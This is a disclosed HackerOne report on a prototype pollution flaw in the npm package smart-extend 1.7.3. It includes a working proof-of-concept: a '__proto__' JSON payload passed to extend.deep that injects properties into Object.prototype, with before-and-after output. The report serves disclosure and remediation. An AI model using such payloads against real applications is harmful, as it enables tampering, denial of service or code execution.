---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '438274'
original_report_id: '438274'
title: Prototype pollution attack (smart-extend)
team_handle: nodejs-ecosystem
created_at: '2018-11-09T16:05:18.849Z'
disclosed_at: '2019-04-03T20:13:18.331Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 2
asset_identifier: smart-extend
asset_type: SOURCE_CODE
max_severity: critical
tags:
- hackerone
---

# Prototype pollution attack (smart-extend)

## Metadata

- HackerOne Report ID: 438274
- Weakness: 
- Program: nodejs-ecosystem
- Disclosed At: 2019-04-03T20:13:18.331Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

Hi team,
I would like to report a prototype pollution vulnerability in smart-extend
that allows an attacker to inject properties on Object.prototype.

# Module

**module name:** smart-extend
**version:** 1.7.3
**npm page:** `https://www.npmjs.com/package/smart-extend`

## Module Description

> smart-extend is an extension to jQuery's classic extend() method with additional features providing you with more power and control over your object extensions/clones. Works in both Node.JS and the browser.

## Module Stats

> 40.948 downloads in the last week

# Vulnerability

## Vulnerability Description

> this vulnerability type is similar the report of Olivier #310443
only `deep` function is vulnerable when it performs a recursive copy of the specified objects.

## Steps To Reproduce:
In the following code snippet, "payload" would come from user-input (JSON data) 

```javascript
var extend = require('smart-extend');

var payload = '{"__proto__":{"polluted":"deep_done !"}}';
var test = {};
console.log("Before: ", test.polluted);
extend.deep({},JSON.parse(payload));
console.log("After: ", test.polluted);
```
get results:
```
Before:  undefined
After:  deep_done !
```
# Wrap up

> Select Y or N for the following statements:

- I contacted the maintainer to let them know: N 
- I opened an issue in the related repository: N 

> Thanks!

## Impact

It causes Denial of Service or RCE in some cases.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
